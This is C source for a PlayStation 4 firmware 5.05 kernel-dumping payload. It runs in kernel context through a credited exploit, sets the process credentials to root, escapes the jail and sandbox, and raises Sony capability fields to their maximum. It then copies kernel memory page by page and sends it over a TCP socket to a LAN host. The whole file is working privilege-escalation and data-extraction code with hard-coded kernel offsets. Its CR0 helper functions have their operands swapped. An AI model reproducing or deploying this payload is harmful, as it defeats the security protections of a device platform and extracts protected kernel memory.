/*****************************************************************
*
* ============== Kernel Dumper for 5.05 - WildCard ===============
*
*	Thanks to:
*	-qwertyoruiopz for his kernel exploit
* -Specter for his Code Execution method and implementation
*	-Shadow for the copyout trick ;)
*
******************************************************************/
#include "ps4.h"

#define printfsocket(format, ...)\
	do {\
		char buffer[512];\
		int size = sprintf(buffer, format, ##__VA_ARGS__);\
		sceNetSend(sock, buffer, size, 0);\
	} while(0)

#define X86_CR0_WP (1 << 16)

#define	KERN_XFAST_SYSCALL	0x1C0		
#define KERN_PRISON_0		0x10986A0
#define KERN_ROOTVNODE	0x22C1A70

#define IP(a, b, c, d) (((a) << 0) + ((b) << 8) + ((c) << 16) + ((d) << 24))

#define	CTL_KERN	1	/* "high kernel": proc, limits */
#define	KERN_PROC	14	/* struct: process entries */
#define	KERN_PROC_VMMAP	32	/* VM map entries for process */
#define	KERN_PROC_PID	1	/* by process id */

struct auditinfo_addr {
    /*
    4    ai_auid;
    8    ai_mask;
    24    ai_termid;
    4    ai_asid;
    8    ai_flags;r
    */
    char useless[184];
};

unsigned int long long __readmsr(unsigned long __register) {
	// Loads the contents of a 64-bit model specific register (MSR) specified in
	// the ECX register into registers EDX:EAX. The EDX register is loaded with
	// the high-order 32 bits of the MSR and the EAX register is loaded with the
	// low-order 32 bits. If less than 64 bits are implemented in the MSR being
	// read, the values returned to EDX:EAX in unimplemented bit locations are
	// undefined.
	unsigned long __edx;
	unsigned long __eax;
	__asm__ ("rdmsr" : "=d"(__edx), "=a"(__eax) : "c"(__register));
	return (((unsigned int long long)__edx) << 32) | (unsigned int long long)__eax;
}

static inline __attribute__((always_inline)) uint64_t readCr0(void) {
	uint64_t cr0;
	
	asm volatile (
		"movq %0, %%cr0"
		: "=r" (cr0)
		: : "memory"
 	);
	
	return cr0;
}

static inline __attribute__((always_inline)) void writeCr0(uint64_t cr0) {
	asm volatile (
		"movq %%cr0, %0"
		: : "r" (cr0)
		: "memory"
	);
}


struct ucred {
	uint32_t useless1;
	uint32_t cr_uid;     // effective user id
	uint32_t cr_ruid;    // real user id
 	uint32_t useless2;
    	uint32_t useless3;
    	uint32_t cr_rgid;    // real group id
    	uint32_t useless4;
    	void *useless5;
    	void *useless6;
    	void *cr_prison;     // jail(2)
    	void *useless7;
    	uint32_t useless8;
    	void *useless9[2];
    	void *useless10;
    	struct auditinfo_addr useless11;
    	uint32_t *cr_groups; // groups
    	uint32_t useless12;
};



struct filedesc {
	void *useless1[3];
    	void *fd_rdir;
    	void *fd_jdir;
};

struct proc {
    	char useless[64];
    	struct ucred *p_ucred;
    	struct filedesc *p_fd;
};

struct thread {
    	void *useless;
    	struct proc *td_proc;
};


struct payload_info
{
  uint64_t uaddr;
};

struct payload_info_dumper
{
  uint64_t uaddr;
  uint64_t kaddr;
};

struct kdump_args
{
  void* syscall_handler;
  struct payload_info_dumper* payload_info_dumper;
};

struct kpayload_args
{
  void* syscall_handler;
  struct payload_info* payload_info;
};


int kdump(struct thread *td, struct kdump_args* args){

	// hook our kernel functions
	void* kernel_base = &((uint8_t*)__readmsr(0xC0000082))[-KERN_XFAST_SYSCALL];
	uint8_t* kernel_ptr = (uint8_t*)kernel_base;

	int (*printfkernel)(const char *fmt, ...) = (void *)(kernel_base + 0x436040);
	int (*copyout)(const void *kaddr, void *uaddr, size_t len) = (void *)(kernel_base + 0x1ea630);
	void (*bzero)(void *b, size_t len) = (void *)(kernel_base + 0x1EA510);


	// pull in our arguments
  uint64_t kaddr = args->payload_info_dumper->kaddr;
	uint64_t uaddr = args->payload_info_dumper->uaddr;

	// run copyout into userland memory for the kaddr we specify
	int cpRet = copyout(kaddr, uaddr , 0x1000);

	// if mapping doesnt exist zero out that mem
	if(cpRet == -1){
		printfkernel("bzero at 0x%016llx\n", kaddr);
		bzero(uaddr, 0x1000);
		return cpRet;
	}
	
	return cpRet;
}

int kpayload(struct thread *td,struct kpayload_args* args){


	struct ucred* cred;
	struct filedesc* fd;

	fd = td->td_proc->p_fd;
	cred = td->td_proc->p_ucred;

	void* kernel_base = &((uint8_t*)__readmsr(0xC0000082))[-KERN_XFAST_SYSCALL];
	uint8_t* kernel_ptr = (uint8_t*)kernel_base;
	void** got_prison0 =   (void**)&kernel_ptr[KERN_PRISON_0];
	void** got_rootvnode = (void**)&kernel_ptr[KERN_ROOTVNODE];

	int (*copyout)(const void *kaddr, void *uaddr, size_t len) = (void *)(kernel_base + 0x1ea630);
	int (*printfkernel)(const char *fmt, ...) = (void *)(kernel_base + 0x436040);

	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	cred->cr_prison = *got_prison0;
	fd->fd_rdir = fd->fd_jdir = *got_rootvnode;

	// escalate ucred privs, needed for access to the filesystem ie* mounting & decrypting files
	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
	
	// sceSblACMgrIsSystemUcred
	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
	*sonyCred = 0xffffffffffffffff;
	
	// sceSblACMgrGetDeviceAccessType
	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
	*sceProcType = 0x3801000000000013; // Max access
	
	// sceSblACMgrHasSceProcessCapability
	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
	*sceProcCap = 0xffffffffffffffff; // Sce Process

	// Say hello and put the kernel base in userland to we can use later

	printfkernel("\n\n\nHELLO FROM YOUR KERN DUDE =)\n\n\n");

	printfkernel("kernel base is:0x%016llx\n\n\n", kernel_base);

	// Say hello and put the kernel base in userland to we can use later

	uint64_t uaddr = args->payload_info->uaddr;

	printfkernel("uaddr is:0x%016llx\n\n\n", uaddr);

	copyout(&kernel_base, uaddr, 8);

	return 0;
}

// props to Hitodama for his hexdump function always nice to have near
int hexDumpKern(const void *data, size_t size, uint64_t kernel_base){

	unsigned char *d = (unsigned char *)data;
	size_t consoleSize = 16;
	char b[consoleSize + 3];
	size_t i;

	// hook kernel print for uart hex dumping
	int (*printf)(const char *fmt, ...) = (void *)(kernel_base + 0x436040);

	if(data == NULL){
		return -1;
		}
	b[0] = '|';
	b[consoleSize + 1] = '|';
	b[consoleSize + 2] = '\0';
	
	printf("\n-------HEX DUMP------\n");
	for (i = 0; i < size; i++)
	{
		if ((i % consoleSize) == 0)
		{
			if (i != 0){
				printf("  %s\n", b);
				}
			printf("%016lx ", (unsigned char *)data + i);
		}

		if(i % consoleSize == 8)
			printf(" ");
		printf(" %02x", d[i]);

		if (d[i] >= ' ' && d[i] <= '~')
			b[i % consoleSize + 1] = d[i];

		else
			b[i % consoleSize + 1] = '.';
		}

		while((i % consoleSize) != 0)
		{

		if(i % consoleSize == 8)
			printf("    ");
	
		else
			printf("   ");
			b[i % consoleSize + 1] = '.';
			i++;
		}

		printf("  %s\n", b);
		return 0;
}

// userland hexdump over socket
int hexDump(const void *data, size_t size,int sock)
{
	unsigned char *d = (unsigned char *)data;
	size_t consoleSize = 16;
	char b[consoleSize + 3];
	size_t i;

	if(data == NULL){
		return -1;
		}
	b[0] = '|';
	b[consoleSize + 1] = '|';
	b[consoleSize + 2] = '\0';
	
	printfsocket("\n-------HEX DUMP------\n");
	for (i = 0; i < size; i++)
	{
		if ((i % consoleSize) == 0)
		{
			if (i != 0){
				printfsocket("  %s\n", b);
				}
			printfsocket("%016lx ", (unsigned char *)data + i);
		}

		if(i % consoleSize == 8)
			printfsocket(" ");
		printfsocket(" %02x", d[i]);

		if (d[i] >= ' ' && d[i] <= '~')
			b[i % consoleSize + 1] = d[i];
		else
			b[i % consoleSize + 1] = '.';
	}
	while((i % consoleSize) != 0)
	{
		if(i % consoleSize == 8)
			printfsocket("    ");
		else
			printfsocket("   ");
		b[i % consoleSize + 1] = '.';
		i++;
	}
	printfsocket("  %s\n", b);
	return 0;
}

int _main(struct thread *td){

	// Init and resolve libraries
	initKernel();
	initLibc();
	initNetwork();
	initPthread();

	// create our server
	struct sockaddr_in server;

	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 1, 77);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));
	int sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));

	
	uint64_t* dump = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);


	printfsocket("connected\n");

	// patch some things in the kernel (sandbox, prison, debug settings etc..)
	
  struct payload_info payload_info;

	payload_info.uaddr = dump;

	kexec(&kpayload,&payload_info);

	printfsocket("kernel patched!\n");

	// retreive the kernel base copied into userland memory and set it

	uint64_t kbase;

	memcpy(&kbase,dump,8);

	printfsocket("kernBase is:0x%016llx\n",kbase);
	printfsocket("dump is:0x%016llx\n",dump);

	// loop on our kdump payload 
	
	uint64_t pos = 0;

  struct payload_info_dumper payload_info_dumper;

	// loop enough to dump up until gpu used memory
	for(int i = 0; i < 0x69B8; i++){
	
  	payload_info_dumper.kaddr = kbase + pos;
		payload_info_dumper.uaddr = dump;

		// call our copyout wrapper and send the userland buffer over socket
		kexec(&kdump, &payload_info_dumper);
		sceNetSend(sock,dump,0x1000,0);
		pos = pos + 0x1000;
	}

	//free(dump);
	sceNetSocketClose(sock);
    return 0;
}


